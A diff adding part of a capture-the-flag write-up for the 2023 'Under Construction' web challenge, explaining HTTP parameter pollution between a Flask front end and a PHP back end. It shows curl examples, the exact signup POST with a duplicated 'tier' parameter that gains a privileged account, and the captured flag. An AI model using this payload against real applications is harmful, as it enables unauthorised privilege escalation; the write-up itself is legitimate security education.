@@ -62,4 +62,40 @@ def signup_post():
   return redirect(url_for('authorized.login'))
 ```
 
-The validation is based on the statement: `request.form.get('tier')`. This will always pick the first parameter if multiple parameters are to be supplied However, the application is passing the `raw_request` as it is to the next application which is in PHP. In order words
+The validation is based on the statement: `request.form.get('tier')`. This will always pick the first parameter if multiple parameters are to be supplied. However, the application is passing the `raw_request` as it is to the next application which is in PHP. 
+
+Take the following example:
+```bash
+# Flask
+curl https://vulnerablepart.com?tier=gold&tier=blue
+# you will the first parameter aka gold.
+
+# PHP
+curl http://vulnerablepart.com?tier=gold&tier=bold
+# you will get the second parameter aka bold
+```
+
+So, in order to exploit this, we needed to create the user normally but with extra argument containing `gold` value. I simply signed up with the following request in Burp: 
+```javascript
+POST /signup HTTP/2
+Host: under-construction-web.2023.ctfcompetition.com
+Upgrade-Insecure-Requests: 1
+Origin: https://under-construction-web.2023.ctfcompetition.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: <Redacted>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+username=hash3liZer&password=password&tier=blue&tier=gold
+```
+
+And it took me back to login page to signin:
+
+<img width="962" alt="image" src="https://github.com/hash3liZer/khatta.sh/assets/29171692/e898c72f-b040-49d5-8f1b-4d07b40c24b3">
+
+So, i went to the PHP application and logged in and got the flag:
+
+<img width="1440" alt="image" src="https://github.com/hash3liZer/khatta.sh/assets/29171692/c6f61468-a875-4656-bd77-7c63190ee67f">
+
+```
+CTF{ff79e2741f21abd77dc48f17bab64c3d}
+```
